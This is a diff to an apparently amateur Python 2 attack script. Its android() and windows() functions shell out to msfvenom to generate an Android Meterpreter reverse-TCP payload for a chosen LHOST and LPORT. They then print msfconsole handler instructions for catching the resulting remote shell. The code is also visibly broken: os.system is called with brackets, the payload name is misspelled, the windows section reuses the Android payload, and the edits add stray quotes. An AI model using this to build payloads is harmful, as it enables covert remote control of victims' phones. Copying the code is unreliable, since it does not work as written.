@@ -57,7 +57,7 @@ def android():
     pt()
     print '\33[33;1m installing payload........'
     pt()
-    os.system['msfvenom -p android/meterpteter/revesrse_tcp LHOST=' + ip + 'LPORT=' + por + ' R > ' + pay]
+    os.system['msfvenom -p android/meterpteter/revesrse_tcp LHOST=' + ip + 'LPORT=' + por + ' R > ' + pay]'
     print ''
     print '\33[33;1m succesfully '
     print ''
@@ -68,8 +68,8 @@ def android():
         print '\33[33;1m msfconsole'
         print '\33[33;1mmulti handler'
         print '\33[33;1m set payload android/meterpreter/reverse_tcp'
-        print '\33[33;1m set LHOST = \33[33;1m LOKAL IP 'format[ip]
-        print '\33[33;1m set LPORT = format[port]
+        print '\33[33;1m set LHOST = \33[33;1m LOKAL IP 'format[ip]'
+        print '\33[33;1m set LPORT = format[port]'
         print 'Exploit'
         print ''
         print '.............................................................'
@@ -107,8 +107,8 @@ def windows():
         print '\33[33;1m msfconsole'
         print '\33[33;1mmulti handler'
         print '\33[33;1m set payload android/meterpreter/reverse_tcp'
-        print '\33[33;1m set LHOST = \33[33;1m LOKAL IP 'format[ip]
-        print '\33[33;1m set LPORT = format[port]
+        print '\33[33;1m set LHOST = \33[33;1m LOKAL IP 'format[ip]'
+        print '\33[33;1m set LPORT = format[port]'
         print 'Exploit'
         print ''
         print '.............................................................'
